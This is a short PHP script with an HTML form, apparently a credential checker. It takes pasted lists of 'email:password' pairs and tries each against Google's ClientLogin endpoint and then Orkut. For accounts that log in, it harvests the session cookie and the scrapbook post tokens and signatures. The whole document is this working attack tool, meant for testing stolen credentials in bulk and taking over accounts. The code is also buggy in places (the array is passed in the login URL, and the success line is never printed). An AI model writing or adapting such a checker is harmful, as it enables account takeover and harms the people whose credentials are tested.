<?php 
if($_POST['ids'] != NULL){
require_once('curl.php');
	$req = new XMLHttpRequest();
	echo "Working IDs are:<br />";
	$ids = explode("\n",$_POST['ids']);
	foreach($ids as $id){
		$email = explode(":", $id);
		$c_email = $email[0];
		$pass = $email[1];
		echo $pass;
		$user_inf = array();
		$req->open("GET","https://www.google.com/accounts/ClientLogin?Email=".$email."&Passwd=".$pass."&service=orkut&skipvpage=true&sendvemail=false");
		$req->send(null);
		preg_match("/auth=(.*?)\n/i", $req->responseText, $auth);
		$user_info['auth'] = $auth[1];
			$req->open("GET","http://www.orkut.com/RedirLogin.aspx?auth=".$user_info['auth']);
			$req->send(null);
			preg_match("/orkut_state=[^;]*/i", $req->getResponseHeader('Set-Cookie'), $orkut_state);
			$user_inf['cookie'] = $orkut_state[0];
			if($user_inf['cookie'] != NULL)
			{
				$req->open("GET","http://www.orkut.com/Scrapbook.aspx");
				$req->setRequestHeader("Cookie",$orkut_state[0]);
				$req->send(null);
				preg_match_all('/\<\input\ type\=\"hidden\"\ name\=\"POST_TOKEN\"\ value\=\"(.*?)\"\>/ism', $req->responseText,$posttoken,PREG_SET_ORDER);
				preg_match_all('/\<\input\ type\=\"hidden\"\ name\=\"signature\"\ value\=\"(.*?)\"\>/ism',$req->responseText,$signature,PREG_SET_ORDER);
				$user_inf['ud_post_token'] = $posttoken[0][1];
				$user_inf['ud_signature'] = $signature[0][1];
				$user_inf['post_token'] = urlencode($user_inf['ud_post_token']);
				$user_inf['signature'] = urlencode($user_inf['ud_signature']);
			}
		if ($user_inf['ud_post_token'] != NULL){
			$c_email.":".$pass."<br />";
		}
	}
}else{ 
?>
<form method="post">
	<div class="loltitleclassic"><b>E-Mail IDs (Please follow the format given in the Textbox)</b></div>
<p><textarea rows="7" name="ids" style="width:99.2%;">Email1:Password1
Email2:Password2
Email3:Password3</textarea></p>
<div class="loltitleclassic"><b>Submit / Reset</b></div>
<p align="left"><input type="submit" value="Submit" name="B1">&nbsp;<input type="reset" value="Reset" name="B2"></p>
</form>